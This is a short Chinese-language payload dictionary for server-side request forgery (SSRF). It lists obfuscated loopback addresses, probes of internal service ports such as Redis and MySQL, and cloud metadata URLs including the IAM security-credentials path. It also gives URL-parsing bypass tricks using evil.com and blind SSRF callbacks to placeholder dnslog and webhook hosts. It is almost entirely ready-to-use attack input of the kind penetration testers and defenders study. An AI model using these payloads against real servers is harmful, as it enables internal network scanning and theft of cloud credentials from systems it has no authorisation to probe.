# 常用 Payload 字典

## 基础联通测试
```txt
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://2130706433/
http://0x7f000001/
http://017700000001/
```

## 端口探测
```txt
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:6379/
http://127.0.0.1:3306/
http://127.0.0.1:11211/
http://127.0.0.1:9200/
```

## 云元数据
```txt
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## URL 结构绕过样例
```txt
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com/
http://localhost./
http://127.1/
```

## Blind SSRF 外带验证
```txt
http://<random>.dnslog.example/
http://webhook.example/ssrf-test
```

## 注意
- payload 不是万能模板，要结合“过滤逻辑 + 请求库行为”。
- 先短 payload 验证，再复杂 payload 扩展。
